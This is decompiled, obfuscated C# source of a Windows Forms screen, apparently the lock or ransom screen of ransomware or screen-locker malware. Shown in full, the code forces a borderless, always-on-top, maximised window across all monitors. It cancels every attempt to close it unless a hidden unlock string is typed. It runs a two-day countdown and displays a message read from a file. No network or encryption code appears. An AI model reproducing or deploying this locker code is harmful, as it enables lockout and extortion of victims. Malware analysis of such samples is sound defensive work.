using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

public sealed class GForm1 : Form
{
	private sealed class Class8
	{
		public TimeSpan timeSpan_0;

		public GForm1 gform1_0;

		internal void method_0()
		{
			((Control)gform1_0.label_0).set_Text(timeSpan_0.ToString(Class6.smethod_0(-1183834860)));
		}
	}

	private sealed class Class9
	{
		public GForm1 gform1_0;

		public DateTime dateTime_0;

		internal Task<int> method_0()
		{
			return gform1_0.method_0(dateTime_0.AddDays(2.0));
		}
	}

	[StructLayout(LayoutKind.Auto)]
	private struct Struct0 : IAsyncStateMachine
	{
		public int int_0;

		public AsyncVoidMethodBuilder asyncVoidMethodBuilder_0;

		public GForm1 gform1_0;

		private TaskAwaiter<int> taskAwaiter_0;

		private void MoveNext()
		{
			int num = int_0;
			GForm1 gForm = gform1_0;
			try
			{
				TaskAwaiter<int> awaiter;
				if (num != 0)
				{
					Class9 @class = new Class9();
					@class.gform1_0 = gform1_0;
					((Form)gForm).set_TopMost(true);
					((Form)gForm).set_FormBorderStyle((FormBorderStyle)0);
					((Form)gForm).set_WindowState((FormWindowState)2);
					Screen val = Screen.FromControl((Control)(object)gForm);
					Screen[] allScreens = Screen.get_AllScreens();
					foreach (Screen val2 in allScreens)
					{
						if (val2 != val)
						{
							((Control)new GForm0(val2)).Show();
						}
					}
					@class.dateTime_0 = DateTime.Now;
					awaiter = Task.Run((Func<Task<int>?>)@class.method_0).GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = 0;
						int_0 = 0;
						taskAwaiter_0 = awaiter;
						asyncVoidMethodBuilder_0.AwaitUnsafeOnCompleted(ref awaiter, ref this);
						return;
					}
				}
				else
				{
					awaiter = taskAwaiter_0;
					taskAwaiter_0 = default(TaskAwaiter<int>);
					num = -1;
					int_0 = -1;
				}
				awaiter.GetResult();
				((Form)gForm).Close();
			}
			catch (Exception exception)
			{
				int_0 = -2;
				asyncVoidMethodBuilder_0.SetException(exception);
				return;
			}
			int_0 = -2;
			asyncVoidMethodBuilder_0.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine stateMachine)
		{
			asyncVoidMethodBuilder_0.SetStateMachine(stateMachine);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(stateMachine);
		}
	}

	[StructLayout(LayoutKind.Auto)]
	private struct Struct1 : IAsyncStateMachine
	{
		public int int_0;

		public AsyncTaskMethodBuilder<int> asyncTaskMethodBuilder_0;

		public GForm1 gform1_0;

		public DateTime dateTime_0;

		private void MoveNext()
		{
			//IL_0035: Unknown result type (might be due to invalid IL or missing references)
			//IL_003f: Expected O, but got Unknown
			GForm1 gForm = gform1_0;
			int result;
			try
			{
				while (!gForm.bool_0)
				{
					Class8 @class = new Class8();
					@class.gform1_0 = gForm;
					@class.timeSpan_0 = dateTime_0 - DateTime.Now;
					((Control)gForm).Invoke((Delegate)new MethodInvoker(@class.method_0));
					Thread.Sleep(1000);
				}
				result = 0;
			}
			catch (Exception exception)
			{
				int_0 = -2;
				asyncTaskMethodBuilder_0.SetException(exception);
				return;
			}
			int_0 = -2;
			asyncTaskMethodBuilder_0.SetResult(result);
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine stateMachine)
		{
			asyncTaskMethodBuilder_0.SetStateMachine(stateMachine);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(stateMachine);
		}
	}

	private bool bool_0;

	private IContainer icontainer_0;

	private TableLayoutPanel tableLayoutPanel_0;

	private PictureBox pictureBox_0;

	private TableLayoutPanel tableLayoutPanel_1;

	private Label label_0;

	private Label label_1;

	private TableLayoutPanel tableLayoutPanel_2;

	private TextBox textBox_0;

	private Label label_2;

	public GForm1()
	{
		method_1();
	}

	private async Task<int> method_0(DateTime dateTime_0)
	{
		while (!bool_0)
		{
			Class8 @class = new Class8();
			@class.gform1_0 = this;
			@class.timeSpan_0 = dateTime_0 - DateTime.Now;
			((Control)this).Invoke((Delegate)new MethodInvoker(@class.method_0));
			Thread.Sleep(1000);
		}
		return 0;
	}

	private void GForm1_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!bool_0)
		{
			((CancelEventArgs)(object)e).Cancel = true;
			((Form)this).OnClosing((CancelEventArgs)(object)e);
		}
	}

	private async void GForm1_Load(object sender, EventArgs e)
	{
		Class9 @class = new Class9();
		@class.gform1_0 = this;
		((Form)this).set_TopMost(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_WindowState((FormWindowState)2);
		Screen val = Screen.FromControl((Control)(object)this);
		Screen[] allScreens = Screen.get_AllScreens();
		foreach (Screen val2 in allScreens)
		{
			if (val2 != val)
			{
				((Control)new GForm0(val2)).Show();
			}
		}
		@class.dateTime_0 = DateTime.Now;
		await Task.Run((Func<Task<int>?>)@class.method_0);
		((Form)this).Close();
	}

	private void textBox_0_TextChanged(object sender, EventArgs e)
	{
		if (((Control)textBox_0).get_Text() == Class6.smethod_0(-1183834779))
		{
			((Control)textBox_0).set_BackColor(Color.Green);
			bool_0 = true;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_1()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_0142: Unknown result type (might be due to invalid IL or missing references)
		//IL_014c: Expected O, but got Unknown
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Expected O, but got Unknown
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0184: Expected O, but got Unknown
		//IL_0249: Unknown result type (might be due to invalid IL or missing references)
		//IL_0253: Expected O, but got Unknown
		//IL_02f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fa: Expected O, but got Unknown
		//IL_030c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0316: Expected O, but got Unknown
		//IL_0328: Unknown result type (might be due to invalid IL or missing references)
		//IL_0332: Expected O, but got Unknown
		//IL_038a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0394: Expected O, but got Unknown
		//IL_0441: Unknown result type (might be due to invalid IL or missing references)
		//IL_044b: Expected O, but got Unknown
		//IL_04e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f3: Expected O, but got Unknown
		//IL_0505: Unknown result type (might be due to invalid IL or missing references)
		//IL_050f: Expected O, but got Unknown
		//IL_0521: Unknown result type (might be due to invalid IL or missing references)
		//IL_052b: Expected O, but got Unknown
		//IL_05b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ba: Expected O, but got Unknown
		//IL_05cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d6: Expected O, but got Unknown
		//IL_05e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f2: Expected O, but got Unknown
		//IL_065c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0666: Expected O, but got Unknown
		//IL_0694: Unknown result type (might be due to invalid IL or missing references)
		//IL_0729: Unknown result type (might be due to invalid IL or missing references)
		//IL_0733: Expected O, but got Unknown
		//IL_0815: Unknown result type (might be due to invalid IL or missing references)
		//IL_081f: Expected O, but got Unknown
		//IL_0847: Unknown result type (might be due to invalid IL or missing references)
		//IL_0851: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm1));
		tableLayoutPanel_0 = new TableLayoutPanel();
		pictureBox_0 = new PictureBox();
		tableLayoutPanel_1 = new TableLayoutPanel();
		label_0 = new Label();
		label_1 = new Label();
		tableLayoutPanel_2 = new TableLayoutPanel();
		textBox_0 = new TextBox();
		label_2 = new Label();
		((Control)tableLayoutPanel_0).SuspendLayout();
		((ISupportInitialize)pictureBox_0).BeginInit();
		((Control)tableLayoutPanel_1).SuspendLayout();
		((Control)tableLayoutPanel_2).SuspendLayout();
		((Control)this).SuspendLayout();
		tableLayoutPanel_0.set_ColumnCount(1);
		tableLayoutPanel_0.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		tableLayoutPanel_0.get_Controls().Add((Control)(object)pictureBox_0, 0, 0);
		tableLayoutPanel_0.get_Controls().Add((Control)(object)tableLayoutPanel_1, 0, 1);
		((Control)tableLayoutPanel_0).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel_0).set_Location(new Point(0, 0));
		((Control)tableLayoutPanel_0).set_Name(Class6.smethod_0(-1183834804));
		tableLayoutPanel_0.set_RowCount(3);
		tableLayoutPanel_0.get_RowStyles().Add(new RowStyle((SizeType)2, 25f));
		tableLayoutPanel_0.get_RowStyles().Add(new RowStyle((SizeType)2, 50f));
		tableLayoutPanel_0.get_RowStyles().Add(new RowStyle((SizeType)2, 25f));
		((Control)tableLayoutPanel_0).set_Size(new Size(1236, 749));
		((Control)tableLayoutPanel_0).set_TabIndex(0);
		((Control)pictureBox_0).set_Dock((DockStyle)5);
		pictureBox_0.set_Image((Image)(object)Class5.smethod_4());
		((Control)pictureBox_0).set_Location(new Point(3, 3));
		((Control)pictureBox_0).set_Name(Class6.smethod_0(-1183834796));
		((Control)pictureBox_0).set_Size(new Size(1230, 181));
		pictureBox_0.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox_0.set_TabIndex(0);
		pictureBox_0.set_TabStop(false);
		tableLayoutPanel_1.set_ColumnCount(1);
		tableLayoutPanel_1.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 100f));
		tableLayoutPanel_1.get_Controls().Add((Control)(object)label_0, 0, 1);
		tableLayoutPanel_1.get_Controls().Add((Control)(object)label_1, 0, 0);
		tableLayoutPanel_1.get_Controls().Add((Control)(object)tableLayoutPanel_2, 0, 2);
		((Control)tableLayoutPanel_1).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel_1).set_Location(new Point(3, 190));
		((Control)tableLayoutPanel_1).set_Name(Class6.smethod_0(-1183834696));
		tableLayoutPanel_1.set_RowCount(3);
		tableLayoutPanel_1.get_RowStyles().Add(new RowStyle((SizeType)2, 33.33333f));
		tableLayoutPanel_1.get_RowStyles().Add(new RowStyle((SizeType)2, 33.33333f));
		tableLayoutPanel_1.get_RowStyles().Add(new RowStyle((SizeType)2, 33.33333f));
		((Control)tableLayoutPanel_1).set_Size(new Size(1230, 368));
		((Control)tableLayoutPanel_1).set_TabIndex(1);
		((Control)label_0).set_Anchor((AnchorStyles)15);
		((Control)label_0).set_AutoSize(true);
		((Control)label_0).set_Font(new Font(Class6.smethod_0(-1183834752), 36f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_0).set_ForeColor(Color.White);
		((Control)label_0).set_Location(new Point(3, 122));
		((Control)label_0).set_Name(Class6.smethod_0(-1183834733));
		((Control)label_0).set_Size(new Size(1224, 122));
		((Control)label_0).set_TabIndex(0);
		((Control)label_0).set_Text(Class6.smethod_0(-1183834656));
		label_0.set_TextAlign((ContentAlignment)32);
		((Control)label_1).set_AutoSize(true);
		((Control)label_1).set_Dock((DockStyle)5);
		((Control)label_1).set_Font(new Font(Class6.smethod_0(-1183834752), 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_1).set_ForeColor(Color.White);
		((Control)label_1).set_Location(new Point(3, 0));
		((Control)label_1).set_Name(Class6.smethod_0(-1183834637));
		((Control)label_1).set_Size(new Size(1224, 122));
		((Control)label_1).set_TabIndex(1);
		((Control)label_1).set_Text(File.ReadAllText(Class6.smethod_0(-1183834685)));
		label_1.set_TextAlign((ContentAlignment)32);
		tableLayoutPanel_2.set_ColumnCount(3);
		tableLayoutPanel_2.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 33.33333f));
		tableLayoutPanel_2.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 33.33333f));
		tableLayoutPanel_2.get_ColumnStyles().Add(new ColumnStyle((SizeType)2, 33.33333f));
		tableLayoutPanel_2.get_Controls().Add((Control)(object)textBox_0, 1, 2);
		tableLayoutPanel_2.get_Controls().Add((Control)(object)label_2, 1, 1);
		((Control)tableLayoutPanel_2).set_Dock((DockStyle)5);
		((Control)tableLayoutPanel_2).set_Location(new Point(3, 247));
		((Control)tableLayoutPanel_2).set_Name(Class6.smethod_0(-1183835095));
		tableLayoutPanel_2.set_RowCount(3);
		tableLayoutPanel_2.get_RowStyles().Add(new RowStyle((SizeType)2, 33.33333f));
		tableLayoutPanel_2.get_RowStyles().Add(new RowStyle((SizeType)2, 33.33333f));
		tableLayoutPanel_2.get_RowStyles().Add(new RowStyle((SizeType)2, 33.33333f));
		((Control)tableLayoutPanel_2).set_Size(new Size(1224, 118));
		((Control)tableLayoutPanel_2).set_TabIndex(2);
		((Control)textBox_0).set_BackColor(Color.FromArgb(64, 64, 64));
		((TextBoxBase)textBox_0).set_BorderStyle((BorderStyle)0);
		((Control)textBox_0).set_Dock((DockStyle)5);
		((Control)textBox_0).set_Font(new Font(Class6.smethod_0(-1183835087), 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox_0).set_ForeColor(Color.White);
		((Control)textBox_0).set_Location(new Point(408, 78));
		((Control)textBox_0).set_Margin(new Padding(0));
		((Control)textBox_0).set_Name(Class6.smethod_0(-1183835108));
		((Control)textBox_0).set_Size(new Size(408, 22));
		((Control)textBox_0).set_TabIndex(1);
		textBox_0.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox_0).add_TextChanged((EventHandler)textBox_0_TextChanged);
		((Control)label_2).set_AutoSize(true);
		((Control)label_2).set_Dock((DockStyle)5);
		((Control)label_2).set_Font(new Font(Class6.smethod_0(-1183834752), 14f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label_2).set_ForeColor(Color.White);
		((Control)label_2).set_Location(new Point(411, 39));
		((Control)label_2).set_Name(Class6.smethod_0(-1183835025));
		((Control)label_2).set_Size(new Size(402, 39));
		((Control)label_2).set_TabIndex(2);
		((Control)label_2).set_Text(Class6.smethod_0(-1183835016));
		label_2.set_TextAlign((ContentAlignment)512);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(1236, 749));
		((Control)this).get_Controls().Add((Control)(object)tableLayoutPanel_0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject(Class6.smethod_0(-1183835041)));
		((Control)this).set_Name(Class6.smethod_0(-1183834964));
		((Control)this).set_Text(Class6.smethod_0(-1183834946));
		((Form)this).add_FormClosing(new FormClosingEventHandler(GForm1_FormClosing));
		((Form)this).add_Load((EventHandler)GForm1_Load);
		((Control)tableLayoutPanel_0).ResumeLayout(false);
		((ISupportInitialize)pictureBox_0).EndInit();
		((Control)tableLayoutPanel_1).ResumeLayout(false);
		((Control)tableLayoutPanel_1).PerformLayout();
		((Control)tableLayoutPanel_2).ResumeLayout(false);
		((Control)tableLayoutPanel_2).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
